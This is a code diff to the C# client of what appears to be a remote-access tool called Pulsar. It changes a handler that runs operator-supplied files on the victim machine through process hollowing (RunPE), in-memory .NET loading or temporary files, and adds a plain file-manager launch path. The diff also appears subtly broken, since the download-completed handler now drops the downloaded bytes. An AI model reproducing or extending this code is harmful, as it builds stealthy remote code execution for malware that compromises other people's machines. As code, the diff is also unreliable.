@@ -268,7 +268,17 @@ namespace Pulsar.Client.Messages
             }
             else
             {
-                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
+                ExecuteProcess(
+                    message.FileBytes,
+                    message.FilePath,
+                    message.IsUpdate,
+                    message.ExecuteInMemoryDotNet,
+                    message.UseRunPE,
+                    message.RunPETarget,
+                    message.RunPECustomPath,
+                    message.FileExtension,
+                    message.IsFromFileManager   // <<< NEW
+                );
             }
         }
 
@@ -281,12 +291,51 @@ namespace Pulsar.Client.Messages
                 SendStatus("Process start failed: Download cancelled or error");
                 return;
             }
-            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
+            ExecuteProcess(
+                message.FileBytes,
+                message.FilePath,
+                message.IsUpdate,
+                message.ExecuteInMemoryDotNet,
+                message.UseRunPE,
+                message.RunPETarget,
+                message.RunPECustomPath,
+                message.FileExtension,
+                message.IsFromFileManager   // <<< NEW
+            );
         }
 
-        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory, bool useRunPE, string runPETarget, string runPECustomPath, string fileExtension)
+        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory,
+            bool useRunPE, string runPETarget, string runPECustomPath, string fileExtension, bool isFromFileManager)
         {
-            if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
+            // ------------------------------------------------------------
+            // 1. FILE MANAGER NORMAL EXECUTION (NO BYTES, NO TEMP, NO POLICY)
+            // ------------------------------------------------------------
+            if (isFromFileManager && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
+            {
+                try
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = filePath,
+                        UseShellExecute = true
+                    });
+
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                    SendStatus($"Executed normally (File Manager): {filePath}");
+                }
+                catch (Exception ex)
+                {
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                    SendStatus($"Normal execution failed: {ex.Message}");
+                }
+
+                return;
+            }
+
+            // ------------------------------------------------------------
+            // 2. REMOTE EXECUTION LOGIC (UPLOAD EXECUTION)
+            // ------------------------------------------------------------
+            if (fileBytes == null && filePath != null && File.Exists(filePath))
                 fileBytes = File.ReadAllBytes(filePath);
 
             if (fileBytes == null || fileBytes.Length == 0)
@@ -298,8 +347,19 @@ namespace Pulsar.Client.Messages
 
             try
             {
-                if (useRunPE) { ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath); return; }
-                if (executeInMemory) { ExecuteViaInMemoryDotNet(fileBytes); return; }
+                if (useRunPE)
+                {
+                    ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath);
+                    return;
+                }
+
+                if (executeInMemory)
+                {
+                    ExecuteViaInMemoryDotNet(fileBytes);
+                    return;
+                }
+
+                // default remote execution
                 ExecuteViaTemporaryFile(fileBytes, fileExtension);
             }
             catch (Exception ex)
